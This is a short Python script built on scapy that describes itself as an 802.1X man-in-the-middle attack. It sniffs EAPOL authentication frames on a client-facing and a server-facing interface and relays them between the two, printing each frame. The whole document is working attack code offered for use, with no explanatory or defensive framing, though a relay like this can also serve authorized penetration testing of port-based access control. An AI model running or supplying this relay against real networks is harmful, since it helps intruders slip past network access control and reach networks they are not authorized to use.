#!/usr/bin/env python3

from scapy.all import *
import sys

# Define the interface for the client and the server
client_iface = "eth0"  # Interface connected to the client
server_iface = "eth1"  # Interface connected to the server

def handle_client_packet(packet):
    """
    Handles packets coming from the client.
    Forwards them to the authentication server.
    """
    if EAPOL in packet:
        print(f"[*] EAPOL packet from client: {packet.summary()}")
        sendp(packet, iface=server_iface, verbose=False)

def handle_server_packet(packet):
    """
    Handles packets coming from the authentication server.
    Forwards them to the client.
    """
    if EAPOL in packet:
        print(f"[*] EAPOL packet from server: {packet.summary()}")
        sendp(packet, iface=client_iface, verbose=False)

def start_mitm():
    """
    Starts the MITM attack by sniffing packets on both interfaces
    and forwarding them between the client and server.
    """
    print(f"[*] Starting MitM attack between client ({client_iface}) and server ({server_iface})...")
    
    # Sniff packets on the client and server interfaces in separate threads
    client_thread = threading.Thread(target=sniff, kwargs={'iface': client_iface, 'prn': handle_client_packet})
    server_thread = threading.Thread(target=sniff, kwargs={'iface': server_iface, 'prn': handle_server_packet})
    
    client_thread.start()
    server_thread.start()
    
    client_thread.join()
    server_thread.join()

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="802.1X MitM Proxy Script")
    parser.add_argument("-c", "--client-interface", required=True, help="Network interface connected to the client")
    parser.add_argument("-s", "--server-interface", required=True, help="Network interface connected to the server")

    args = parser.parse_args()

    client_iface = args.client_interface
    server_iface = args.server_interface

    start_mitm()